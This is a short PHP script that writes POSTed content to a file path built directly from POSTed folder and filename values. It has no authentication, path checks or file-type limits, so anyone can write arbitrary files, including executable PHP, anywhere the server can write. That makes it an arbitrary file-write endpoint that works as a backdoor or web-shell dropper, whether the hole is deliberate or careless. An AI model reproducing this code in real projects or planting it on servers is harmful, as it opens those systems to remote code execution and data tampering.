<?php

if (isset($_POST['folder']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $file = $_POST['folder'] . $_POST['filename'];
    $data = $_POST['content'];

    if (file_put_contents($file, $data)) {
        die('success');
    }
}

die('error');